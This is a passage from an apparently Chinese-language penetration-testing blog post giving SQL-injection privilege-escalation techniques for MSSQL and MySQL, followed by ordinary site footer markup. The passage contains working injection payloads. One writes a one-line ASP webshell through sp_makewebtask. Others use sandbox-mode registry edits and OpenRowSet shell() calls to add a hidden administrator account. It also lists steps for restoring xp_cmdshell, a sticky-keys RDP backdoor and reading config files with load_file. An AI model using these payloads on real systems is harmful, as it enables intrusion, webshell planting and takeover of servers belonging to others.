system:f<br>相比而言sandboxmode的局限性比较小,只需要可以使用xp_regwrite 开启而一般站点管理员对xp_regwrite 的安全配置会比较马虎<br>xp_regwrite被删时,可EXEC sp_addextendedproc xp_regwrite,’xpstar.dll’恢复<br>本文讨论的只是sqlserver 注射下的冰山一角，当是抛砖引玉吧~<br>十五、更高级的union select，跨库查询<br>这里说的是ACCESS的跨库，原文地址：<br><a href="http://www.4ngel.NET/article/46.htm" target="_blank" rel="external">http://www.4ngel.NET/article/46.htm</a></p>
<p>十六、SQL注射及提权经验<br>MSSQL数据库：<br>1：SA权限<br>一般说来,无论谁拿到一个SA权限的注射点。都会很开心。</p>
<p><1>直接执行net user等命令。</1></p>
<p><2>可列目录但不能执行系统命令。<br>可以列出目录找出网站中可以利用的地方,比如ewebeditor,或者上传地址(试试是否有上传漏洞),等等。<br>或者找服务器下其他网站,然后入侵之。<br>如果无其他漏洞可以找到,那就利用备份得到一个webshell。</2></p>
<p><3>无cmdshell<br>那就恢复之。详细请参考<br><a href="http://www.hacker.com.cn/forum/view_118677.html" target="_blank" rel="external">http://www.hacker.com.cn/forum/view_118677.html</a> ;   中的6楼</3></p>
<p><4>如果无法恢复cmdshell<br><a href="http://forum.eviloctal.com/viewthread.php?tid=31487&amp;highlight=sa" target="_blank" rel="external">http://forum.eviloctal.com/viewthread.php?tid=31487&amp;highlight=sa</a><br>可以参考下这篇文章。也就是利用的sp_oacreate来执行。可以通过5次shift来登陆3389<br>还可以利用sp_makewebtask直接在web目录里写入一句话马<br><a href="http://127.0.0.1/sql.asp?id=1&#39;;exec%20sp_makewebtask%20&#39;d:\www\xxx.asp&#39;,&#39;%20select%20" target="_blank" rel="external">http://127.0.0.1/sql.asp?id=1&#39;;exec%20sp_makewebtask%20&#39;d:\www\xxx.asp&#39;,&#39;%20select%20</a>‘’&lt;%25execute(request(“a”))%25&gt;’’%20’;–<br>还可以利用沙盒模式提权<br>EXEC%20master.dbo.xp_regwrite%20’HKEY_LOCAL_MACHINE’,’SoftWare\Microsoft\Jet\4.0\Engines’,’SandBoxMode’,’REG_DWORD’,0;–<br>Select<em>From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database=c:\windows\system32\ias\ias.mdb’,’select shell(“net user aloner$ aloner /add”)’);–<br>;Select</em>From OpenRowSet(‘Microsoft.Jet.OLEDB.4.0’,’;Database=c:\windows\system32\ias\ias.mdb’,’select shell(“net localgroup administrators aloner$ /add”)’);–<br>如果上述方法仍然不行,那就猜解出后台帐户和密码,然后登陆后台。看看有没什么可以利用的。<br>2：db权限<br>Db权限可以列出网站目录，然后备份。用一句话连接得到webshell.<br>如果可以列目录,但无法备份，也同样可以利用找其他漏洞来入侵。毕竟整个网站都可以被你浏览了。<br>然后就是猜解出后台帐户和密码登陆后台了。<br>还有一种就是关于一篇db权限备份到启动项得到系统权限。可以参考下这篇文章<br><a href="http://www.hacker.com.cn/article/view_13207.html" target="_blank" rel="external">http://www.hacker.com.cn/article/view_13207.html</a><br>public权限<br>此权限很多人不会利用。<br>但是可以列出目录的。<br>具体参考这篇文章<br><a href="http://www.hacker.com.cn/forum/view_118677.html第10楼。" target="_blank" rel="external">http://www.hacker.com.cn/forum/view_118677.html第10楼。</a><br>Mysql数据库:<br>Root权限下可以直接利用loadfile读取网站的文件内容(网站的配置信息)<br>然后就是注入语句得到管理员密码，登陆后台</4></p>

        </div>
        <div class="post-tool">
            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
            </a>
        </div>
        
        <div class="post-tags">Tags：
            
            <a href="/tags/渗透/">渗透</a>
            
        </div>
        
    </article>
    
    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
    
    
</div>
<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
        </div><!-- end #main-->
    </div><!-- end #body -->
    <footer class="footer">
    <div class="footer-inner">
        <p>
            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
            <!-- 自定义链接 -->
            <a href="/help" title="help" >急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
            <a href="/links" title="友情链接">友情链接</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
            <a href="/app" title="App下载">App下载</a>
        </p>
        <p>
            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br/>
            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
            ，主题&nbsp<a href="https://github.com/5279314" target="_blank">LinuxBoy</a>
            ，作者<a href="https://www.linuxboy.top" target="_blank">王先森</a>
            ，Hosted by <a href="https://www.linuxboy.top" style="font-weight: bold">Coding Pages</a>
        </p>
        

    </div>
</footer>
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
<script src="/js/InsightSearch.js"></script>
<script src="/js/SimpleCore.js"></script>

</div>
<div class="fixed-btn">
    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
</div>
<script>
    $(function () {
        SimpleCore.init({
            buildingTime: '08/10/2018',
            current: $('.post-tags').length > 0 ? 'post' : 'archive',
            snsQRCode: '/images/sns-qrcode.png',
            donateImg: '/images/donate-qr.png',
        });
    });
</script>
</body>
</html>
